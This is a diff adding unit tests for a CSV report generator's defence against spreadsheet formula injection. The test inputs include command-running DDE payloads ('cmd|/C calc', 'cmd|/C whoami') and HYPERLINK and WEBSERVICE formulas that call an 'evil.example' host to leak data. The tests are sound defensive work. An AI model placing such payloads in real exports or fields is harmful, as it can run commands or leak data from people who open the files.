@@ -87,6 +87,42 @@ def test_generate_csv_report_includes_new_columns():
     assert "CVE-2026-0001" in csv_output
 
 
+def test_sanitize_csv_cell_neutralizes_formula_prefixes():
+    sanitize = ReportGenerator._sanitize_csv_cell
+
+    assert sanitize("=1+1") == "'=1+1"
+    assert sanitize("+cmd|'/C calc'!A0") == "'+cmd|'/C calc'!A0"
+    assert sanitize("-2+3") == "'-2+3"
+    assert sanitize("@SUM(A1:A2)") == "'@SUM(A1:A2)"
+    assert sanitize("plain text") == "plain text"
+    assert sanitize("") == ""
+    assert sanitize(None) is None
+    assert sanitize(8.1) == 8.1
+
+
+def test_generate_csv_report_sanitizes_formula_injection():
+    task = sample_task()
+    result = sample_result()
+    finding = result["structured"]["findings"][0]
+    finding["title"] = '=HYPERLINK("http://evil.example/?x=",A1)'
+    finding["category"] = "+cmd|'/C calc'!A0"
+    finding["target"] = "@SUM(A1:A2)"
+    finding["description"] = "-2+3"
+    finding["proof"] = '=WEBSERVICE("http://evil.example/")'
+    finding["remediation"] = "=cmd|'/C whoami'!A0"
+
+    csv_output = ReportGenerator.generate_csv_report(task, result)
+
+    assert "'=HYPERLINK" in csv_output
+    assert "'+cmd|" in csv_output
+    assert "'@SUM" in csv_output
+    assert "'-2+3" in csv_output
+    assert "'=WEBSERVICE" in csv_output
+    assert "'=cmd|" in csv_output
+    assert "\n=HYPERLINK" not in csv_output
+    assert "\n@SUM" not in csv_output
+
+
 def test_build_report_payload_includes_parameters_and_command():
     payload = ReportGenerator._build_report_payload(sample_task(), sample_result())
 
